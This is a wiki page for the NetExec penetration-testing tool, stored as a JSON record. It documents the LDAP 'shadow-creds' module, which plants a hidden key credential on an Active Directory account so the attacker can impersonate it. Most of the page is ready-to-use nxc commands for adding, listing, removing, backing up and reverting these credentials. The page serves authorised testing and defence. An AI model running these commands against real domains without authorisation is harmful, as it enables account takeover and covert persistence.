{"title": "Shadow Credentials Attack", "source": "netexec", "source_label": "NetExec Wiki", "path": "ldap-protocol/shadow-credentials", "html": "<h1 id=\"shadow-credentials-attack\">🆕 Shadow Credentials Attack</h1>\n<p>The LDAP shadow-creds module enables the Shadow Credentials attack, an exploitation technique inspired by <a href=\"https://github.com/ShutdownRepo/pywhisker\">pyWhisker</a>. This attack allows an attacker to add a hidden authentication credential to a target account and impersonate it without modifying its existing password.</p>\n<p>Relevated actions are below:</p>\n<div class=\"highlight\"><pre><span></span><code>list\nadd\nremove\nbackup\nrevert\nkeyCredentials of computers.\n</code></pre></div>\n<p>Add/list/remove usage</p>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>shadow-creds<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">TARGET</span><span class=\"o\">=</span>targetcomputer$<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>add\nnxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>shadow-creds<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">TARGET</span><span class=\"o\">=</span>targetcomputer$<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>list\nnxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>shadow-creds<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">TARGET</span><span class=\"o\">=</span>targetcomputer$<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>remove\n</code></pre></div>\n<p>Cred info usage</p>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>shadow-creds<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">TARGET</span><span class=\"o\">=</span>targetcomputer$<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>list\nnxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>shadow-creds<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">TARGET</span><span class=\"o\">=</span>targetcomputer$<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>info<span class=\"w\"> </span><span class=\"nv\">DEVICE_ID</span><span class=\"o\">=</span>&lt;guid&gt;\n</code></pre></div>\n<p>Backup and Revert</p>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>shadow-creds<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">TARGET</span><span class=\"o\">=</span>targetcomputer$<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>list\nnxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>shadow-creds<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">TARGET</span><span class=\"o\">=</span>targetcomputer$<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>add\nnxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>shadow-creds<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">TARGET</span><span class=\"o\">=</span>targetcomputer$<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>backup\nnxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>shadow-creds<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">TARGET</span><span class=\"o\">=</span>targetcomputer$<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>remove<span class=\"w\"> </span><span class=\"nv\">DEVICE_ID</span><span class=\"o\">=</span>&lt;guid&gt;\nnxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>shadow-creds<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">TARGET</span><span class=\"o\">=</span>targetcomputer$<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>revert<span class=\"w\"> </span><span class=\"nv\">JSONFILE</span><span class=\"o\">=</span>shadow-creds.json\n</code></pre></div>", "excerpt": "🆕 Shadow Credentials Attack The LDAP shadow-creds module enables the Shadow Credentials attack, an exploitation technique inspired by pyWhisker . This attack allows an attacker to add a hidden authent", "tags": []}